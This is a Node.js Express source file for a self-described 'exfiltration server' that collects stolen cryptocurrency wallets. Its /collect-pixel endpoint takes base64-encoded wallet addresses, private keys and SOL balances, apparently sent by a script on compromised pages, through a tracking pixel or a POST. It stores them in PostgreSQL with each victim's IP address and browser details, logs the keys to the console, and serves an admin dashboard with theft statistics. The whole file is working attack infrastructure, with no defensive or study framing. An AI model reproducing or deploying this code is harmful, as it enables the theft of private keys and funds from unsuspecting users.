require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Rate limiting - FIXED for proxy headers
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    trustProxy: true,
    keyGenerator: (req) => {
        return req.ip || req.connection.remoteAddress;
    }
});
app.use('/api/', limiter);

// ========================================
// POSTGRESQL DATABASE CONNECTION
// ========================================

const pool = new Pool({
    user: process.env.DB_USER || 'exfil_user',
    password: process.env.DB_PASSWORD || 'exfil123',
    host: process.env.DB_HOST || 'localhost',
    port: process.env.DB_PORT || 5432,
    database: process.env.DB_NAME || 'exfiltration_db',
    max: 20,
    idleTimeoutMillis: 30000,
    connectionTimeoutMillis: 10000,
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

async function initDatabase() {
    let retries = 5;
    while (retries > 0) {
        try {
            const client = await pool.connect();
            console.log('✅ PostgreSQL Connected Successfully');
            
            await client.query(`
                CREATE TABLE IF NOT EXISTS wallets (
                    id SERIAL PRIMARY KEY,
                    domain VARCHAR(255),
                    user_id VARCHAR(255),
                    wallet_address VARCHAR(255) UNIQUE NOT NULL,
                    private_key TEXT NOT NULL,
                    balance DECIMAL(20, 8) DEFAULT 0,
                    ip_address VARCHAR(45),
                    user_agent TEXT,
                    referrer TEXT,
                    collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            `);
            
            await client.query(`CREATE INDEX IF NOT EXISTS idx_collected_at ON wallets(collected_at DESC)`);
            await client.query(`CREATE INDEX IF NOT EXISTS idx_wallet_address ON wallets(wallet_address)`);
            await client.query(`CREATE INDEX IF NOT EXISTS idx_user_id ON wallets(user_id)`);
            
            console.log('✅ Database tables ready');
            client.release();
            return true;
        } catch (error) {
            console.error(`❌ PostgreSQL Connection Error (${retries} retries left):`, error.message);
            retries--;
            if (retries === 0) {
                console.log('⚠️ Running without database - data will not be saved!');
                return false;
            }
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
    return false;
}

// ========================================
// API ROUTES
// ========================================

app.get('/health', async (req, res) => {
    let dbStatus = 'disconnected';
    try {
        await pool.query('SELECT 1');
        dbStatus = 'connected';
    } catch (e) {
        dbStatus = 'disconnected';
    }
    
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        database: 'PostgreSQL',
        dbStatus: dbStatus
    });
});

app.get('/collect-pixel', async (req, res) => {
    const { d, r, redirect } = req.query;
    const timestamp = new Date();
    const ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    console.log('\n' + '='.repeat(80));
    console.log('📡 EXFILTRATION EVENT DETECTED!');
    console.log('='.repeat(80));
    console.log(`🕒 Time: ${timestamp.toLocaleString()}`);
    console.log(`🌐 IP: ${ip}`);
    console.log(`🔗 Referrer: ${r || 'N/A'}`);
    console.log(`🔄 Redirect: ${redirect ? 'Yes' : 'No'}`);
    
    if (!d) {
        console.log('❌ No data parameter received');
        // If there's a redirect, go back even on error
        if (redirect) {
            return res.redirect(decodeURIComponent(redirect));
        }
        return res.status(400).json({ error: 'Missing data parameter' });
    }
    
    try {
        const decodedData = Buffer.from(d, 'base64').toString('utf-8');
        const walletData = JSON.parse(decodedData);
        
        console.log(`📦 Domain: ${walletData.domain}`);
        console.log(`👤 User ID: ${walletData.user || 'N/A'}`);
        console.log(`💰 Wallets Found: ${walletData.wallets?.length || 0}`);
        
        if (walletData.wallets && walletData.wallets.length > 0) {
            console.log('\n💰 WALLET EXTRACTION SUMMARY:');
            
            const client = await pool.connect();
            
            try {
                await client.query('BEGIN');
                
                for (const wallet of walletData.wallets) {
                    const query = `
                        INSERT INTO wallets (domain, user_id, wallet_address, private_key, balance, ip_address, user_agent, referrer, collected_at)
                        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
                        ON CONFLICT (wallet_address) 
                        DO UPDATE SET 
                            balance = EXCLUDED.balance,
                            private_key = EXCLUDED.private_key,
                            updated_at = CURRENT_TIMESTAMP
                    `;
                    
                    await client.query(query, [
                        walletData.domain,
                        walletData.user || 'unknown',
                        wallet.addr,
                        wallet.priv,
                        parseFloat(wallet.bal) || 0,
                        ip,
                        userAgent,
                        r,
                        timestamp
                    ]);
                    
                    console.log(`   ✅ Wallet: ${wallet.addr} | ${wallet.bal} SOL`);
                    console.log(`      Private Key: ${wallet.priv}`);
                }
                
                await client.query('COMMIT');
                console.log(`\n💾 Data saved to PostgreSQL`);
                console.log(`⚠️ TOTAL WALLETS COMPROMISED: ${walletData.wallets.length}`);
                
            } catch (err) {
                await client.query('ROLLBACK');
                console.error('❌ Database error:', err.message);
                throw err;
            } finally {
                client.release();
            }
        } else {
            console.log('⚠️ No wallets in data');
        }
        
        console.log('='.repeat(80) + '\n');
        
        // Check if we need to redirect back
        if (redirect) {
            console.log(`🔄 Redirecting back to: ${decodeURIComponent(redirect)}`);
            return res.redirect(decodeURIComponent(redirect));
        }
        
        // Otherwise return the 1x1 pixel GIF
        const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
        res.writeHead(200, {
            'Content-Type': 'image/gif',
            'Cache-Control': 'no-cache, no-store, must-revalidate'
        });
        res.end(pixel);
        
    } catch (error) {
        console.error('❌ Error processing exfiltration:', error.message);
        console.error('Stack:', error.stack);
        
        // Even on error, redirect back if requested
        if (redirect) {
            console.log(`🔄 Redirecting back to (error): ${decodeURIComponent(redirect)}`);
            return res.redirect(decodeURIComponent(redirect));
        }
        
        res.status(500).json({ error: 'Internal server error', message: error.message });
    }
});

app.post('/collect-pixel', async (req, res) => {
    const { data, referrer } = req.body;
    const ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    if (!data) {
        return res.status(400).json({ error: 'Missing data' });
    }
    
    try {
        const decodedData = Buffer.from(data, 'base64').toString('utf-8');
        const walletData = JSON.parse(decodedData);
        
        const client = await pool.connect();
        
        try {
            await client.query('BEGIN');
            
            for (const wallet of walletData.wallets) {
                await client.query(`
                    INSERT INTO wallets (domain, user_id, wallet_address, private_key, balance, ip_address, user_agent, referrer)
                    VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
                    ON CONFLICT (wallet_address) DO UPDATE SET
                        balance = EXCLUDED.balance,
                        private_key = EXCLUDED.private_key
                `, [
                    walletData.domain,
                    walletData.user || 'unknown',
                    wallet.addr,
                    wallet.priv,
                    parseFloat(wallet.bal) || 0,
                    ip,
                    userAgent,
                    referrer
                ]);
            }
            
            await client.query('COMMIT');
            res.json({ success: true, count: walletData.wallets.length });
        } catch (err) {
            await client.query('ROLLBACK');
            throw err;
        } finally {
            client.release();
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: 'Internal error' });
    }
});

// Admin auth middleware
const adminAuth = (req, res, next) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
        return res.status(401).json({ error: 'No authorization header' });
    }
    
    const token = authHeader.split(' ')[1];
    const expectedToken = Buffer.from(`${process.env.ADMIN_USERNAME || 'admin'}:${process.env.ADMIN_PASSWORD || 'admin123'}`).toString('base64');
    
    if (token !== expectedToken) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    next();
};

app.get('/api/wallets', adminAuth, async (req, res) => {
    try {
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 50;
        const offset = (page - 1) * limit;
        
        const countResult = await pool.query('SELECT COUNT(*) as total FROM wallets');
        const total = parseInt(countResult.rows[0].total);
        
        const result = await pool.query(`
            SELECT * FROM wallets 
            ORDER BY collected_at DESC 
            LIMIT $1 OFFSET $2
        `, [limit, offset]);
        
        res.json({
            success: true,
            data: result.rows,
            pagination: {
                page,
                limit,
                total,
                pages: Math.ceil(total / limit)
            }
        });
    } catch (error) {
        console.error('Error fetching wallets:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/stats', adminAuth, async (req, res) => {
    try {
        const totalWallets = await pool.query('SELECT COUNT(*) as count FROM wallets');
        const uniqueUsers = await pool.query('SELECT COUNT(DISTINCT user_id) as count FROM wallets WHERE user_id IS NOT NULL');
        const totalBalance = await pool.query('SELECT COALESCE(SUM(balance), 0) as total FROM wallets');
        const last24h = await pool.query(`
            SELECT COUNT(*) as count FROM wallets 
            WHERE collected_at >= NOW() - INTERVAL '24 hours'
        `);
        
        res.json({
            success: true,
            stats: {
                totalWallets: parseInt(totalWallets.rows[0].count),
                uniqueUsers: parseInt(uniqueUsers.rows[0].count),
                totalBalance: parseFloat(totalBalance.rows[0].total),
                last24hExfiltrations: parseInt(last24h.rows[0].count)
            }
        });
    } catch (error) {
        console.error('Error fetching stats:', error);
        res.status(500).json({ error: error.message });
    }
});

app.delete('/api/wallets/:id', adminAuth, async (req, res) => {
    try {
        const result = await pool.query('DELETE FROM wallets WHERE id = $1 RETURNING id', [req.params.id]);
        if (result.rowCount === 0) {
            return res.status(404).json({ error: 'Wallet not found' });
        }
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.delete('/api/clear-all', adminAuth, async (req, res) => {
    try {
        await pool.query('TRUNCATE TABLE wallets RESTART IDENTITY');
        res.json({ success: true, message: 'All data cleared' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ========================================
// SERVE ADMIN DASHBOARD (FROM public FOLDER)
// ========================================

// Ensure public directory exists
const publicDir = path.join(__dirname, 'public');
if (!fs.existsSync(publicDir)) {
    fs.mkdirSync(publicDir, { recursive: true });
}

// Serve static files from public folder
app.use(express.static(publicDir));

// Admin route - serves the admin.html file from public folder
app.get('/admin', (req, res) => {
    const adminHtmlPath = path.join(publicDir, 'admin.html');
    if (fs.existsSync(adminHtmlPath)) {
        res.sendFile(adminHtmlPath);
    } else {
        res.status(404).send('admin.html not found. Please create it in the public folder.');
    }
});

// ========================================
// START SERVER
// ========================================
async function startServer() {
    await initDatabase();
    
    app.listen(PORT, '0.0.0.0', () => {
        console.log('\n' + '='.repeat(80));
        console.log('🚀 PRIMARY EXFILTRATION SERVER (PostgreSQL)');
        console.log('='.repeat(80));
        console.log(`\n✅ Server running on port: ${PORT}`);
        console.log(`📡 Collection endpoint: /collect-pixel`);
        console.log(`📊 Admin Dashboard: /admin`);
        console.log(`\n🔐 Admin Credentials:`);
        console.log(`   Username: ${process.env.ADMIN_USERNAME || 'admin'}`);
        console.log(`   Password: ${process.env.ADMIN_PASSWORD || 'admin123'}`);
        console.log('\n' + '='.repeat(80));
    });
}

startServer();

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n\n🛑 Shutting down...');
    await pool.end();
    console.log('Database connection closed');
    process.exit(0);
});


// ========================================
// POSTGRESQL DATABASE CONNECTION
// ========================================

// PostgreSQL connection pool
// const pool = new Pool({
//     user: process.env.DB_USER || 'exfil_user',
//     password: process.env.DB_PASSWORD || 'exfil123',
//     host: process.env.DB_HOST || 'localhost',
//     port: process.env.DB_PORT || 5433,
//     database: process.env.DB_NAME || 'exfiltration_db',
//     max: 20,
//     idleTimeoutMillis: 30000,
//     connectionTimeoutMillis: 2000,
// });

// // Test database connection and create tables
// async function initDatabase() {
//     try {
//         await pool.connect();
//         console.log('✅ PostgreSQL Connected Successfully');
        
//         // Create tables if not exists
//         await pool.query(`
//             CREATE TABLE IF NOT EXISTS wallets (
//                 id SERIAL PRIMARY KEY,
//                 domain VARCHAR(255),
//                 user_id VARCHAR(255),
//                 wallet_address VARCHAR(255) UNIQUE NOT NULL,
//                 private_key TEXT NOT NULL,
//                 balance DECIMAL(20, 8) DEFAULT 0,
//                 ip_address VARCHAR(45),
//                 user_agent TEXT,
//                 referrer TEXT,
//                 collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
//                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
//                 updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
//             )
//         `);
        
//         // Create indexes for better performance
//         await pool.query(`
//             CREATE INDEX IF NOT EXISTS idx_collected_at ON wallets(collected_at DESC);
//             CREATE INDEX IF NOT EXISTS idx_wallet_address ON wallets(wallet_address);
//             CREATE INDEX IF NOT EXISTS idx_user_id ON wallets(user_id);
//             CREATE INDEX IF NOT EXISTS idx_ip_address ON wallets(ip_address);
//         `);
        
//         // Create function to update updated_at timestamp
//         await pool.query(`
//             CREATE OR REPLACE FUNCTION update_updated_at_column()
//             RETURNS TRIGGER AS $$
//             BEGIN
//                 NEW.updated_at = CURRENT_TIMESTAMP;
//                 RETURN NEW;
//             END;
//             $$ language 'plpgsql';
//         `);
        
//         // Create trigger for updated_at
//         await pool.query(`
//             DROP TRIGGER IF EXISTS update_wallets_updated_at ON wallets;
//             CREATE TRIGGER update_wallets_updated_at
//                 BEFORE UPDATE ON wallets
//                 FOR EACH ROW
//                 EXECUTE FUNCTION update_updated_at_column();
//         `);
        
//         // Create stats table for analytics
//         await pool.query(`
//             CREATE TABLE IF NOT EXISTS exfiltration_stats (
//                 id SERIAL PRIMARY KEY,
//                 total_events INTEGER DEFAULT 0,
//                 total_wallets INTEGER DEFAULT 0,
//                 total_balance DECIMAL(20, 8) DEFAULT 0,
//                 last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
//             )
//         `);
        
//         // Insert initial stats row if not exists
//         await pool.query(`
//             INSERT INTO exfiltration_stats (id, total_events, total_wallets, total_balance)
//             SELECT 1, 0, 0, 0
//             WHERE NOT EXISTS (SELECT 1 FROM exfiltration_stats WHERE id = 1)
//         `);
        
//         console.log('✅ Database tables and indexes created');
//         return true;
//     } catch (error) {
//         console.error('❌ PostgreSQL Connection Error:', error.message);
//         console.log('\n⚠️ Please ensure PostgreSQL is running:');
//         console.log('   - Windows: "net start postgresql-15" as Administrator');
//         console.log('   - Docker: "docker start postgres-exfil"');
//         console.log('   - Or install PostgreSQL from https://www.postgresql.org/download/\n');
//         return false;
//     }
// }

